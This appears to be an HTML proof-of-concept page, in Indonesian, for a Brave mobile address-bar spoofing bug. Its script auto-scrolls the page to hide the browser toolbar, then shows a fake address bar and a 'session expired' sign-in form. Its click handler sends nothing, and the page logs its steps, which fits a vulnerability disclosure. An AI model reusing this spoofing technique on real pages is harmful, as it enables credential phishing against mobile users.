<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Dokumen Dibagikan</title>
<style>
  html,body{margin:0;font-family:Arial;}
  body{height:500vh;background:#f5f7fb;}
  #content{padding:20px;}
  #fakebar{
    display:none;
    position:fixed; top:0; left:0; right:0; height:56px;
    background:#fff; box-shadow:0 1px 4px rgba(0,0,0,.25);
    align-items:center; padding:0 14px; font-family:Arial; font-size:14px;
    z-index:9999; color:#222;
  }
  #fakebar .lock{color:#188038;margin-right:8px;font-size:16px;}
  #fakeform{
    display:none; position:fixed; top:56px; left:0; right:0;
    background:#fff; padding:24px; z-index:9998;
  }
  #fakeform input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;}
  #fakeform button{width:100%;padding:12px;margin-top:6px;}
  #log{
    position:fixed; bottom:0; left:0; right:0; background:#fff7cc;
    font-family:monospace; font-size:10px; max-height:140px; overflow:auto;
    padding:6px; border-top:2px solid #cc0; z-index:99999;
  }
</style>
</head>
<body>
<div id="fakebar"><span class="lock">&#128274;</span>accounts.example-login-demo.test</div>
<div id="fakeform">
  <h3>Sesi berakhir, masuk lagi</h3>
  <input placeholder="Email">
  <input placeholder="Password" type="password">
  <button id="go">Lanjutkan</button>
</div>

<div id="content">
  <h1>Dokumen Dibagikan</h1>
  <p>Buka link ini DI BRAVE ANDROID/iOS (bukan desktop). Diamkan beberapa detik, lalu perhatikan bagian paling atas layar.</p>
  <p>Scroll ke bawah sedikit untuk lihat sisa halaman (atau tidak usah, scriptnya coba memicu sendiri).</p>
</div>

<div id="log"></div>

<script>
function log(m){
  const el=document.getElementById('log');
  const l=document.createElement('div');
  l.textContent=new Date().toISOString()+' '+m;
  el.appendChild(l);
  el.scrollTop=el.scrollHeight;
}

log('halaman dimuat. innerHeight='+window.innerHeight+' outerHeight='+window.outerHeight);

window.addEventListener('scroll', () => {
  log('scroll event, scrollY='+window.scrollY+' innerHeight='+window.innerHeight);
});

const initialInnerHeight = window.innerHeight;

function showFakeUI(reason) {
  document.getElementById('fakebar').style.display = 'flex';
  document.getElementById('fakeform').style.display = 'block';
  log('fake address bar + fake form ditampilkan (' + reason + ')');
}

function animatedScroll(targetY, duration) {
  const startY = window.scrollY;
  const startTime = performance.now();
  function step(now) {
    const t = Math.min(1, (now - startTime) / duration);
    const y = startY + (targetY - startY) * t;
    window.scrollTo(0, y);
    if (t < 1) {
      requestAnimationFrame(step);
    } else {
      log('animatedScroll selesai. scrollY=' + window.scrollY + ' innerHeight=' + window.innerHeight + ' (awal ' + initialInnerHeight + ')');
      setTimeout(checkToolbarAndReveal, 300);
    }
  }
  requestAnimationFrame(step);
}

function checkToolbarAndReveal() {
  const grew = window.innerHeight > initialInnerHeight + 20;
  log('cek toolbar: innerHeight sekarang=' + window.innerHeight + ', awal=' + initialInnerHeight + ' -> ' + (grew ? 'TOOLBAR TAMPAK NGUMPET (innerHeight nambah)' : 'toolbar kelihatan masih tampil / tidak berubah'));
  showFakeUI(grew ? 'toolbar terdeteksi ngumpet' : 'dipaksa tampil walau toolbar belum pasti ngumpet');
}

function burstScroll(steps, stepSize, delayMs) {
  let i = 0;
  const iv = setInterval(() => {
    window.scrollBy(0, stepSize);
    i++;
    if (i >= steps) {
      clearInterval(iv);
      log('burstScroll selesai ('+steps+' step x '+stepSize+'px). scrollY='+window.scrollY+' innerHeight='+window.innerHeight+' (awal '+initialInnerHeight+')');
      setTimeout(checkToolbarAndReveal, 300);
    }
  }, delayMs);
}

setTimeout(() => {
  log('mencoba animatedScroll(0 -> 1500px, 600ms) meniru swipe panjang...');
  animatedScroll(1500, 600);
  setTimeout(() => {
    log('lanjut mencoba burstScroll (30 step x 40px, tiap 16ms) meniru fling cepat...');
    burstScroll(30, 40, 16);
  }, 1200);
}, 2000);

document.getElementById('go').addEventListener('click', (e) => {
  e.preventDefault();
  log('[DEMO] sign-in diklik, tidak ada data terkirim ke mana pun');
});
</script>
</body>
</html>
